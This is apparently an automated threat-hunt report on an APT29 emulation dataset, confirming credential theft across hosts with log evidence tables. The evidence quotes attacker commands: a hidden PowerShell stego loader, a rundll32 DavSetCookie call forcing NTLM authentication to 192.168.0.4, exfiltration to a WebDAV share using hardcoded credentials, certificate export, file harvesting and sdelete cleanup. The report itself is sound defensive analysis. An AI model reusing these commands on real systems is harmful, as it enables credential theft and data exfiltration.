# Threat hunt report — 20261017-081620-converged-final-full

**Hypothesis:** An adversary who compromised Windows hosts in this network stole credentials from them (MITRE ATT&CK tactic: Credential Access).

**Verdict: Confirmed** — 10 in-scope incident(s) of verified malicious findings (confidence >= medium): I01 T1003 (F02), I02 T1003.001 (F01, F10, F26, F37, F42, F56), I03 T1056.001 (F09), I04 T1056.002 (F11), I05 T1187 (F18), I06 T1552 (F55), I07 T1552.001 (F23), I08 T1552.001 (F53), I09 T1552.001 (F54), I10 T1552.004 (F22, F51)

Verdict method: rules over verified evidence (Confirmed if >=1 in-scope incident of verified malicious findings (confidence >= medium); Inconclusive if only suspicious incidents or coverage gaps; Refuted if full coverage and no malicious/suspicious finding)

| Run | Value |
|---|---|
| Profile | converged (thinking=False, temperature=0.0) |
| Model | deepseek-flash |
| Started / finished (UTC) | 2026-10-17T00:16:20+00:00 / 2026-10-17T00:25:46+00:00 (565.7 s) |
| LLM calls / tokens | 128 / {'prompt': 3307343, 'completion': 107521} |
| MCP tool calls | 1061 (server tools: list_data_sources, get_fields, search, count, aggregate, timeline, esql, get_event, get_registry) |
| ATT&CK tactics | credential-access — An adversary with existing access to Windows hosts on this network is stealing credentials from those hosts. |

## Data examined

| Dataset | Events | First event (UTC) | Last event (UTC) | Hosts / observers | Sources (channel → template) |
|---|---|---|---|---|---|
| windows.other | 216 | 2020-05-02 02:56:47.000Z | 2020-05-02 03:23:08.000Z | scranton.dmevals.local, newyork.dmevals.local, nashua.dmevals.local, utica.dmevals.local | apt29-windows-other (push → windows-other) |
| windows.powershell | 10979 | 2020-05-02 02:56:14.000Z | 2020-05-02 03:21:30.000Z | scranton.dmevals.local, newyork.dmevals.local, nashua.dmevals.local | apt29-powershell (stream → windows-powershell) |
| windows.security | 41002 | 2020-05-02 02:55:25.000Z | 2020-05-02 03:28:09.000Z | scranton.dmevals.local, newyork.dmevals.local, nashua.dmevals.local, utica.dmevals.local | apt29-security (push → windows-security) |
| windows.sysmon | 143884 | 2020-05-02 02:55:23.551Z | 2020-05-02 03:28:17.683Z | scranton.dmevals.local, nashua.dmevals.local, newyork.dmevals.local, utica.dmevals.local | apt29-sysmon (pull → windows-sysmon) |
| zeek | 2140 | 2020-04-30 00:06:38.899Z | 2020-04-30 00:45:00.760Z | bobs.bigwheel.local, simplerockbuild.simplerock.lan | zeek-nashua (pull → zeek); zeek-scranton (pull → zeek) |

> Time windows: windows.other [2020-05-02T02:56:47.000Z .. 2020-05-02T03:23:08.000Z] and zeek [2020-04-30T00:06:38.899Z .. 2020-04-30T00:45:00.760Z] do not overlap. Events of these datasets were not correlated by time.

> Time windows: windows.powershell [2020-05-02T02:56:14.000Z .. 2020-05-02T03:21:30.000Z] and zeek [2020-04-30T00:06:38.899Z .. 2020-04-30T00:45:00.760Z] do not overlap. Events of these datasets were not correlated by time.

> Time windows: windows.security [2020-05-02T02:55:25.000Z .. 2020-05-02T03:28:09.000Z] and zeek [2020-04-30T00:06:38.899Z .. 2020-04-30T00:45:00.760Z] do not overlap. Events of these datasets were not correlated by time.

> Time windows: windows.sysmon [2020-05-02T02:55:23.551Z .. 2020-05-02T03:28:17.683Z] and zeek [2020-04-30T00:06:38.899Z .. 2020-04-30T00:45:00.760Z] do not overlap. Events of these datasets were not correlated by time.

The whole stored time range of every dataset was searched (planned checks carry no time filter).

## Incidents

Verified malicious/suspicious findings grouped by attacker action, each with the single best-fitting technique (consolidation step). In-scope incidents decide the verdict.

| Incident | Technique | In scope | Assessment | Findings | Title |
|---|---|---|---|---|---|
| I01 | T1003 | yes | malicious/medium | F02 | Credential-access tooling staged via PsExec and hidden PowerShell on compromised hosts |
| I02 | T1003.001 | yes | malicious/high | F01, F10, F26, F37, F42, F56 | LSASS memory access with PROCESS_ALL_ACCESS by hidden PowerShell loader on scranton |
| I03 | T1056.001 | yes | malicious/high | F09 | PowerShell keylogger (Get-Keystrokes) executed on scranton by user pbeesly |
| I04 | T1056.002 | yes | malicious/medium | F11 | Screen capture and clipboard harvesting in the attacker PowerShell session on scranton |
| I05 | T1187 | yes | malicious/high | F18 | WebDAV forced authentication via rundll32 davclnt.dll DavSetCookie on scranton |
| I06 | T1552 | yes | malicious/high | F55 | PyInstaller python.exe staged via PsExec on nashua beacons to 192.168.0.4:8443 and drives the harvesting chain |
| I07 | T1552.001 | yes | malicious/high | F23 | PowerShell Invoke-Exfil script with embedded plaintext credentials and archive of Downloads |
| I08 | T1552.001 | yes | malicious/high | F53 | PowerShell on nashua harvests credential-named files across user profile into password-protected archive |
| I09 | T1552.001 | yes | malicious/high | F54 | Rar.exe on nashua creates password-protected archive of harvested files, then sdelete wipes artifacts |
| I10 | T1552.004 | yes | malicious/high | F22, F51 | PowerShell Get-PrivateKeys exported all LocalMachine certificates to .pfx files |

## Findings

### F02 · malicious / medium · T1003 · Credential-access tooling staged via PsExec and hidden PowerShell on compromised hosts

Evidence status: **verified**

The environment shows hands-on-keyboard credential-access tradecraft: PsExec64.exe and PSEXESVC.exe were executed on nashua.dmevals.local (PSEXESVC service installed repeatedly by user pbeesly), and a hidden PowerShell loader ran on scranton.dmevals.local. These are the staging mechanisms surrounding the LSASS access. No standalone credential-dumping binary (mimikatz/procdump/comsvcs) was observed on disk, so the dumping appears to be performed in-memory via PowerShell.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:11:39.000Z | nashua.dmevals.local | windows.other | message | A service was installed in the system.    Service Name:  PSEXESVC  Service File Name:  %SystemRoot%\PSEXESVC.exe  Service Type:  user mode service  Service Star… | .ds-logs-windows.other-default-2026.10.17-000001 / AaFHNH1uOFchItbrYMQT | q-c5c94e1e7f | ok |
| 2 | 2020-05-02 02:58:44.325Z | scranton.dmevals.local | windows.sysmon | process.parent.executable | C:\Windows\System32\control.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHNH1uOFchItQB61zZ | q-19b622389a | ok |

### F01 · malicious / high · T1003.001 · LSASS memory accessed with PROCESS_ALL_ACCESS by hidden PowerShell loader on scranton

Evidence status: **verified**

On scranton.dmevals.local, a PowerShell process (PID 2976, user DMEVALS\pbeesly, IntegrityLevel High) was spawned by control.exe with a hidden window and execution-policy bypass, decoding a steganographic payload from C:\Users\pbeesly\Downloads\monkey.png and IEX-ing it. Seconds later the same PowerShell process opened a handle to lsass.exe (PID 736) with GrantedAccess 0x1FFFFF (PROCESS_ALL_ACCESS) and 0x1F3FFF, the access mask used to read LSASS memory for credential dumping. Windows Security 4663 confirms powershell.exe accessing \Device\HarddiskVolume2\Windows\System32\lsass.exe as pbeesly at the same time. A second host, nashua.dmevals.local, shows wsmprovhost.exe (PowerShell Remoting) opening lsass.exe with 0x1F3FFF with a call trace through Microsoft.PowerShell.Commands.Management, consistent with a PowerShell-based LSASS dump.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:05:16.654Z | scranton.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1fffff | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTka0Gm | q-9d242aeb56 | ok |
| 2 | 2020-05-02 03:05:16.623Z | scranton.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1f3fff | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTka0Gj | q-9d242aeb56 | ok |
| 3 | 2020-05-02 02:58:44.325Z | scranton.dmevals.local | windows.sysmon | process.command_line | "PowerShell.exe" -noni -noexit -ep bypass -window hidden -c "sal a New-Object;Add-Type -AssemblyName 'System.Drawing'; $g=a System.Drawing.Bitmap('C:\Users\pbee… | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHNH1uOFchItQB61zZ | q-19b622389a | ok |
| 4 | 2020-05-02 03:09:29.430Z | nashua.dmevals.local | windows.sysmon | win.SourceImage | C:\windows\system32\wsmprovhost.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHNH1uOFchItUHCTY0 | q-96aa221cbe | ok |
| 5 | 2020-05-02 03:05:16.000Z | scranton.dmevals.local | windows.security | win.ObjectName | \Device\HarddiskVolume2\Windows\System32\lsass.exe | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItaDOKBk | q-928a3a303e | ok |

### F10 · malicious / high · T1056 · PowerShell opens LSASS with PROCESS_ALL_ACCESS (0x1FFFFF) on scranton

Evidence status: **verified**

At 2020-05-02T03:05:16.654Z on scranton.dmevals.local, PowerShell.exe (PID 2976, running as SYSTEM, S-1-5-18) opened a handle to C:\windows\system32\lsass.exe (PID 736) with GrantedAccess 0x1FFFFF (PROCESS_ALL_ACCESS), preceded 31 ms earlier by a 0x1f3fff access. This is the same interactive attacker session (user pbeesly) that minutes later ran the keylogger and screen-capture toolkit; full-access LSASS handles are used for credential/input capture (e.g. dumping or hooking LSASS). The call trace shows ntdll/KERNELBASE with an UNKNOWN module, consistent with injected/reflective code rather than a normal signed consumer.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:05:16.654Z | scranton.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1fffff | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTka0Gm | q-593e5d62f7 | ok |
| 2 | 2020-05-02 03:05:16.654Z | scranton.dmevals.local | windows.sysmon | win.SourceImage | C:\windows\system32\WindowsPowerShell\v1.0\PowerShell.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTka0Gm | q-593e5d62f7 | ok |
| 3 | 2020-05-02 03:05:16.654Z | scranton.dmevals.local | windows.sysmon | win.TargetImage | C:\windows\system32\lsass.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTka0Gm | q-593e5d62f7 | ok |
| 4 | 2020-05-02 03:05:16.654Z | scranton.dmevals.local | windows.sysmon | win.CallTrace | C:\windows\SYSTEM32\ntdll.dll+9c584\|C:\windows\System32\KERNELBASE.dll+2732e\|UNKNOWN(000001996D28200D) | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTka0Gm | q-593e5d62f7 | ok |

### F09 · malicious / high · T1056.001 · PowerShell keylogger (Get-Keystrokes) executed on scranton by user pbeesly

Evidence status: **verified**

On 2020-05-02 between 03:06:47 and 03:07:36 UTC, on host scranton.dmevals.local, user pbeesly (DMEVALS\pbeesly, SID S-1-5-21-1830255721-3727074217-2423397540-1107) ran an interactive PowerShell session (PID 3852) that loaded an attacker toolkit from C:\Program Files\SysinternalsSuite\psversion.ps1. The toolkit defines a Keystroke-Check function that enumerates AV/EDR processes (avp, acs, outpost, mcvsescn, mcods, navapsvc, kav, AvastSvc, AvastUi, nod32krn, nod32, ekern, dwengine, MsMpEng, msseces, ekrn, savservice, scfservice, savadminservice) — classic keylogger anti-detection — and then invokes Get-Keystrokes, sleeping 15 seconds and reading the 'Keystrokes' job output. This is input capture (keylogging) on the compromised host.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:06:47.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | function Keystroke-Check {     Get-Process \| Where-Object { $_.ProcessName -Eq "avp" -or $_.ProcessName -Eq "acs" -or $_.ProcessName -Eq "outpost" -or $_.Proce… | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHNX1uOFchItZRk1CS | q-949b8dff51 | ok |
| 2 | 2020-05-02 03:06:59.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | Get-Keystrokes;Start-Sleep -Seconds 15;View-Job -JobName "Keystrokes" | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHNX1uOFchItZRk1C1 | q-c29c264534 | ok |
| 3 | 2020-05-02 03:06:47.000Z | scranton.dmevals.local | windows.powershell | win.Path | C:\Program Files\SysinternalsSuite\psversion.ps1 | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHNX1uOFchItZRk1CS | q-949b8dff51 | ok |
| 4 | 2020-05-02 03:06:47.000Z | scranton.dmevals.local | windows.powershell | user.name | pbeesly | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHNX1uOFchItZRk1CS | q-949b8dff51 | ok |

### F11 · malicious / medium · T1056.002 · Screen capture and clipboard harvesting in the same attacker PowerShell session

Evidence status: **verified**

In the same scranton.dmevals.local session (user pbeesly, PID 3852) at 03:05:53 the toolkit defined Invoke-ScreenCapture, which loops taking screenshots of the virtual screen via System.Windows.Forms/System.Drawing into $env:USERPROFILE\Downloads, and at 03:06:42 the operator ran Get-Clipboard to harvest clipboard contents. These are GUI input/display capture actions consistent with collecting credentials and sensitive data from the interactive desktop. No fake credential dialog (CredUIPromptForCredentials) was observed, so this is GUI capture rather than a spoofed prompt.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:05:53.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | function Invoke-ScreenCapture # https://www.pdq.com/blog/capturing-screenshots-with-powershell-and-net/ {     Start-Job -Name "Screenshot" -ScriptBlock {       … | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHNX1uOFchItZRlFBP | q-c29c264534 | ok |
| 2 | 2020-05-02 03:06:42.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | Get-Clipboard | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHNX1uOFchItZRk1Cy | q-c29c264534 | ok |
| 3 | 2020-05-02 03:05:53.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | Invoke-ScreenCapture;Start-Sleep -Seconds 3;View-Job -JobName "Screenshot" | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHNX1uOFchItZRlFD4 | q-c29c264534 | ok |

### F18 · malicious / high · T1187 · WebDAV forced authentication via rundll32 davclnt.dll DavSetCookie on scranton.dmevals.local

Evidence status: **verified**

On scranton.dmevals.local, in the context of user DMEVALS\pbeesly, PowerShell created a StartUp shortcut (hostui.lnk) and downloaded OfficeSupplies.7z, then repeatedly executed 'rundll32.exe C:\windows\system32\davclnt.dll,DavSetCookie 192.168.0.4 http://192.168.0.4/webdav' (03:08:50 and 03:10:22-23). DavSetCookie is the canonical WebDAV forced-authentication primitive: it makes the WebClient service authenticate to an attacker-controlled WebDAV server, leaking the user's NTLM credentials. Zeek corroborates the coercion: host 10.0.1.4 issued WebDAV OPTIONS/PROPFIND requests to 192.168.0.4:80 with user-agent 'Microsoft-WebDAV-MiniRedir/10.0.18362', receiving 401 Unauthorized (NTLM challenge) responses, including a PROPFIND for /webdav/OfficeSupplies.7z. This is attacker-driven credential coercion, not normal system behaviour.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:10:23.154Z | scranton.dmevals.local | windows.sysmon | process.command_line | rundll32.exe C:\windows\system32\davclnt.dll,DavSetCookie 192.168.0.4 http://192.168.0.4/webdav | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTVHe6C | q-9b2a25af0b | ok |
| 2 | 2020-05-02 03:10:23.154Z | scranton.dmevals.local | windows.sysmon | process.parent.executable | C:\Windows\System32\svchost.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTVHe6C | q-61aca5a03d | ok |
| 3 | 2020-05-02 03:10:23.154Z | scranton.dmevals.local | windows.sysmon | user.name | pbeesly | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTVHe6C | q-61aca5a03d | ok |
| 4 | 2020-05-02 03:08:35.270Z | scranton.dmevals.local | windows.sysmon | win.TargetFilename | C:\Users\pbeesly\AppData\Roaming\OfficeSupplies.7z | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTWI7pZ | q-5f210833ba | ok |
| 5 | 2020-05-02 03:04:23.681Z | scranton.dmevals.local | windows.sysmon | win.TargetFilename | C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\hostui.lnk | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTmcl_4 | q-5f210833ba | ok |
| 6 | 2020-04-30 00:32:21.422Z | simplerockbuild.simplerock.lan | zeek | user_agent.original | Microsoft-WebDAV-MiniRedir/10.0.18362 | .ds-logs-zeek-default-2026.10.17-000001 / AaFHNX1uOFchItbgrYgH | q-2b8f49a963 | ok |
| 7 | 2020-04-30 00:32:21.422Z | simplerockbuild.simplerock.lan | zeek | http.response.status_code | 401 | .ds-logs-zeek-default-2026.10.17-000001 / AaFHNX1uOFchItbgrYgH | q-19384e0ef8 | ok |
| 8 | 2020-04-30 00:32:21.895Z | simplerockbuild.simplerock.lan | zeek | url.original | /webdav/OfficeSupplies.7z | .ds-logs-zeek-default-2026.10.17-000001 / AaFHNX1uOFchItbgrYgN | q-b659c169a0 | ok |

### F55 · malicious / high · T1552 · PyInstaller python.exe staged via PsExec on nashua beacons to 192.168.0.4:8443 and drives the harvesting chain

Evidence status: **verified**

On nashua.dmevals.local, C:\Windows\Temp\python.exe (a PyInstaller bundle, extracting _MEI29522 with _socket.pyd/_ssl.pyd) was launched by C:\Windows\PSEXESVC.exe as pbeesly, made hundreds of outbound connections to 192.168.0.4:8443, dropped Rar.exe and sdelete64.exe into C:\Windows\Temp, and spawned the PowerShell session that performed the credential-file harvesting. This is the tooling that staged the credential theft on nashua.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:11:40.213Z | nashua.dmevals.local | windows.sysmon | process.command_line | "C:\Windows\Temp\python.exe"  | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTVGQmt | q-2d14e92f28 | ok |
| 2 | 2020-05-02 03:15:05.142Z | nashua.dmevals.local | windows.sysmon | destination.ip | 192.168.0.4 | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItPK66ha | q-b8d991409a | ok |
| 3 | 2020-05-02 03:15:31.530Z | nashua.dmevals.local | windows.sysmon | file.path | C:\Windows\Temp\Rar.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItPK6qjB | q-d8a540e34a | ok |
| 4 | 2020-05-02 03:15:48.652Z | nashua.dmevals.local | windows.sysmon | process.parent.executable | C:\Windows\Temp\python.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItPK6qid | q-0817ee5ff3 | ok |

### F23 · malicious / high · T1552.001 · PowerShell Invoke-Exfil script with embedded plaintext credentials and archive of Downloads

Evidence status: **verified**

On scranton.dmevals.local, user pbeesly ran a PowerShell script block (EventID 4104, path C:\Program Files\SysinternalsSuite\psversion.ps1) defining function Invoke-Exfil. It installs the 7Zip4Powershell module, compresses everything in $env:USERPROFILE\Downloads into a password-protected archive ($env:APPDATA\OfficeSupplies.7z, password "lolol"), and constructs a PSCredential from hardcoded plaintext username "cozy" and password "MyCozyPassw0rd!" to map a WebDAV share (\\192.168.0.4\webdav) and copy the archive out. The script itself stores credentials in a file, and it packages the previously exported private keys for exfiltration.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:08:02.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | function Invoke-Exfil {      if (!(Get-Module -Name "7Zip4Powershell")) { Write-Host "[*] Installing 7Zip4Powershell module"; Install-Module -Name 7Zip4Powershe… | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHNX1uOFchItZCgBha | q-9fb53591a0 | ok |
| 2 | 2020-05-02 03:08:02.000Z | scranton.dmevals.local | windows.powershell | win.Path | C:\Program Files\SysinternalsSuite\psversion.ps1 | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHNX1uOFchItZCgBha | q-c3c09d45be | ok |
| 3 | 2020-05-02 03:08:02.000Z | scranton.dmevals.local | windows.powershell | process.command_line | function Invoke-Exfil {      if (!(Get-Module -Name "7Zip4Powershell")) { Write-Host "[*] Installing 7Zip4Powershell module"; Install-Module -Name 7Zip4Powershe… | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHNX1uOFchItZCgBha | q-9fb53591a0 | ok |

### F53 · malicious / high · T1552.001 · PowerShell on nashua harvests credential-named files across user profile into password-protected archive

Evidence status: **verified**

On nashua.dmevals.local, user pbeesly ran a PowerShell script (ScriptBlock ID 4adf51bc-704e-4481-8e1f-d7af5cc7acaa, PID 4876) that recursively enumerates the entire user profile for files matching credential-related patterns (*psw*, *pass*, *login*, *admin*, *sifr*, *sifer*, *vpn, *.pst, *.ost, *.txt, *.lnk, etc.) and compresses them into $env:APPDATA\working.zip. This is a new host/activity not present in the scranton-centric anchors.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:15:59.000Z | nashua.dmevals.local | windows.powershell | win.ScriptBlockText | $env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,… | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHNX1uOFchItZLhp5i | q-a82d1ecab6 | ok |
| 2 | 2020-05-02 03:16:00.353Z | nashua.dmevals.local | windows.sysmon | file.path | C:\Users\pbeesly\AppData\Roaming\working.zip | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItPCxFs- | q-00cf6b062e | ok |

### F54 · malicious / high · T1552.001 · Rar.exe on nashua creates password-protected archive of harvested files, then sdelete wipes artifacts

Evidence status: **verified**

On nashua.dmevals.local, C:\Windows\Temp\Rar.exe (staged by the python.exe loader) was run by pbeesly with a hardcoded password (-hpfGzq5yKw) to create C:\Users\pbeesly\Desktop\working.zip from the harvested AppData\working.zip. sdelete64.exe was then used to securely delete Rar.exe and both working.zip copies, indicating anti-forensic cleanup of the credential-collection staging.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:16:19.395Z | nashua.dmevals.local | windows.sysmon | process.command_line | "C:\Windows\Temp\Rar.exe" a -hpfGzq5yKw C:\Users\pbeesly\Desktop\working.zip C:\Users\pbeesly\AppData\Roaming\working.zip | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTPA5kN | q-2d14e92f28 | ok |
| 2 | 2020-05-02 03:16:52.456Z | nashua.dmevals.local | windows.sysmon | process.command_line | .\sdelete64.exe  /accepteula "C:\Windows\Temp\Rar.exe" | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItPO_TIA | q-2d14e92f28 | ok |
| 3 | 2020-05-02 03:17:18.030Z | nashua.dmevals.local | windows.sysmon | process.command_line | .\sdelete64.exe  /accepteula "C:\Users\pbeesly\AppData\Roaming\working.zip"  | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItPJ5Bh7 | q-2d14e92f28 | ok |

### F22 · malicious / high · T1552.004 · PowerShell Get-PrivateKeys exported all LocalMachine certificates to .pfx files

Evidence status: **verified**

On scranton.dmevals.local, user pbeesly ran a PowerShell script block (EventID 4104, script path C:\Program Files\SysinternalsSuite\readme.ps1) defining function Get-PrivateKeys. It builds a SecureString from the hardcoded password "saribas", enumerates cert:\LocalMachine recursively, and calls Export-PfxCertificate for every cert with a thumbprint, writing random-named .pfx files into $env:USERPROFILE\Downloads. Sysmon EventID 11 confirms the resulting file C:\Users\pbeesly\Downloads\coyn5igj.3io.pfx was created by powershell.exe (PID 3876) at 2020-05-02T03:04:57Z. This is direct theft of private keys/certificates from the host.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:04:56.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | function Get-PrivateKeys {     $mypwd = ConvertTo-SecureString -String "saribas" -Force -AsPlainText     $CertPaths = Get-ChildItem -Path cert:\LocalMachine -Re… | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHNX1uOFchItZSl2ML | q-9fb53591a0 | ok |
| 2 | 2020-05-02 03:04:56.000Z | scranton.dmevals.local | windows.powershell | win.Path | C:\Program Files\SysinternalsSuite\readme.ps1 | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHNX1uOFchItZSl2ML | q-b5ade2e758 | ok |
| 3 | 2020-05-02 03:04:57.460Z | scranton.dmevals.local | windows.sysmon | win.TargetFilename | C:\Users\pbeesly\Downloads\coyn5igj.3io.pfx | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTkbEF9 | q-98204c3e52 | ok |
| 4 | 2020-05-02 03:04:57.460Z | scranton.dmevals.local | windows.sysmon | process.executable | C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTkbEF9 | q-c4176ef8d9 | ok |

### F42 · malicious / high · T1558 · LSASS memory access by PowerShell on scranton (credential dumping) — no Kerberos ticket theft observed

Evidence status: **verified**

On scranton.dmevals.local, PowerShell.exe (PID 2976) opened lsass.exe with GrantedAccess 0x1F3FFF (full memory read) at 2020-05-02T03:05:16.623Z, the classic credential-dumping access used to harvest Kerberos material. This PowerShell was spawned from a malicious .scr (C:\ProgramData\victim\â€®cod.3aka3.scr) launched by explorer.exe under user pbeesly, which also ran a shellcode loader (VirtualAlloc/CreateThread) and set a Folder\shell\open\command persistence key. A second full-access LSASS read came from wsmprovhost.exe on nashua.dmevals.local at 03:09:29.430Z. However, the Kerberos-specific events (4768/4769) are all normal successful RC4 logon/TGS traffic on newyork.dmevals.local for pbeesly and SCRANTON$; no forged/roasted ticket indicators were found.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:05:16.623Z | scranton.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1f3fff | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTka0Gj | q-8c05690c7c | ok |
| 2 | 2020-05-02 03:05:16.623Z | scranton.dmevals.local | windows.sysmon | win.TargetImage | C:\windows\system32\lsass.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTka0Gj | q-3ac345949c | ok |
| 3 | 2020-05-02 03:05:16.623Z | scranton.dmevals.local | windows.sysmon | process.executable | C:\windows\system32\WindowsPowerShell\v1.0\PowerShell.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTka0Gj | q-8c05690c7c | ok |
| 4 | 2020-05-02 03:09:29.430Z | nashua.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1f3fff | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHNH1uOFchItUHCTY0 | q-8c05690c7c | ok |
| 5 | 2020-05-02 02:55:56.157Z | scranton.dmevals.local | windows.sysmon | process.executable | C:\ProgramData\victim\â€®cod.3aka3.scr | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHNH1uOFchItQE_psP | q-60371c275b | ok |
| 6 | 2020-05-02 02:58:45.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | $cFIrwwpZzGzU = @"  [DllImport("kernel32.dll")]  public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);… | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHNX1uOFchItZWqNA3 | q-adcfe2c104 | ok |

### F51 · malicious / high · T1649 · PowerShell exports all LocalMachine private-key certificates to .pfx on scranton.dmevals.local

Evidence status: **verified**

On scranton.dmevals.local, a hidden execution-policy-bypassed PowerShell ("PowerShell.exe" -noni -noexit -ep bypass -window hidden) decoded a steganographic payload from C:\Users\pbeesly\Downloads\monkey.png and IEX-executed it (APT29 loader). Its child PowerShell (PID 3876, user DMEVALS\pbeesly, High integrity) ran a Get-PrivateKeys function loaded from the masquerading path C:\Program Files\SysinternalsSuite\readme.ps1. The script enumerates cert:\LocalMachine recursively and calls Export-PfxCertificate for every certificate with a thumbprint, writing a randomly-named .pfx into $env:USERPROFILE\Downloads protected by the hardcoded password "saribas". Sysmon EID 11 confirms the resulting file C:\Users\pbeesly\Downloads\coyn5igj.3io.pfx was created by that powershell.exe at 2020-05-02T03:04:57Z. This is theft of authentication certificates/private keys (T1649).

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:04:56.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | function Get-PrivateKeys {     $mypwd = ConvertTo-SecureString -String "saribas" -Force -AsPlainText     $CertPaths = Get-ChildItem -Path cert:\LocalMachine -Re… | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHNX1uOFchItZSl2ML | q-e757529fe3 | ok |
